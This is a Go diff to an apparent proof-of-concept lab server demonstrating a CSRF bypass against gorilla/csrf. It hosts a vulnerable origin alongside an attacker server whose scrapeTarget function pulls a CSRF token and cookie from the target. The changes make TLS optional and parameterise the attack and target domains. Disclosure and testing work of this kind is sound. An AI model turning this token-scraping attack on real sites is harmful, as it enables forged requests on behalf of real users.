@@ -10,6 +10,7 @@ import (
 	"html/template"
 	"io"
 	"log"
+	"net"
 	"net/http"
 	"net/http/cookiejar"
 	"strings"
@@ -39,20 +40,27 @@ var (
 
 func main() {
 	flag.Parse()
-	if *tlsCertFile == "" || *tlsKeyFile == "" {
-		log.Fatal("both -tls-cert and -tls-key must be provided")
+	var ln net.Listener
+	var err error
+
+	if *tlsCertFile != "" && *tlsKeyFile != "" {
+		crt, err := tls.LoadX509KeyPair(*tlsCertFile, *tlsKeyFile)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		config := &tls.Config{Certificates: []tls.Certificate{crt}}
+		ln, err = tls.Listen("tcp", *listen, config)
+		if err != nil {
+			log.Fatalf("failed to create listener %v", err)
+		}
+	} else {
+		ln, err = net.Listen("tcp", ":8080")
+		if err != nil {
+			log.Fatalf("failed to create listener %v", err)
+		}
 	}
 
-	crt, err := tls.LoadX509KeyPair(*tlsCertFile, *tlsKeyFile)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	config := &tls.Config{Certificates: []tls.Certificate{crt}}
-	ln, err := tls.Listen("tcp", *listen, config)
-	if err != nil {
-		log.Fatal(err)
-	}
 	log.Printf("listening on %s", ln.Addr())
 
 	// vulnerable origin with current gorilla/csrf
@@ -65,7 +73,7 @@ func main() {
 	trustedCrossOrigin := safe.Protect(
 		[]byte("32-byte-long-auth-key"),
 		safe.Secure(true),
-		safe.TrustedOrigins([]string{"attack.example.test"}),
+		safe.TrustedOrigins([]string{fmt.Sprintf("attack.%s", *domain)}),
 	)(http.HandlerFunc(targetOriginHandler))
 
 	as := newAttackerServer(*domain)
@@ -78,6 +86,8 @@ func main() {
 			trustedCrossOrigin.ServeHTTP(w, r)
 		case strings.HasPrefix(r.Host, "attack."):
 			as.ServeHTTP(w, r)
+		case strings.HasPrefix(r.Host, "target."):
+			vulnerableOrigin.ServeHTTP(w, r)
 		default:
 			vulnerableOrigin.ServeHTTP(w, r)
 		}
@@ -90,6 +100,7 @@ func serveTargetHome(w http.ResponseWriter, r *http.Request) {
 	data := map[string]any{
 		csrf.TemplateTag: csrf.TemplateField(r),
 		"CSRFToken":      csrf.Token(r),
+		"Domain":         *domain,
 	}
 	w.Header().Set("Content-Type", "text/html")
 
@@ -214,7 +225,7 @@ func (as *attackerServer) attackerOriginHandler(w http.ResponseWriter, _ *http.R
 }
 
 func (as *attackerServer) scrapeTarget(domain string) (token, cookie string, err error) {
-	resp, err := as.client.Get("https://" + domain + "/params.json")
+	resp, err := as.client.Get(fmt.Sprintf("https://target.%s/params.json", domain))
 	if err != nil {
 		return "", "", err
 	}
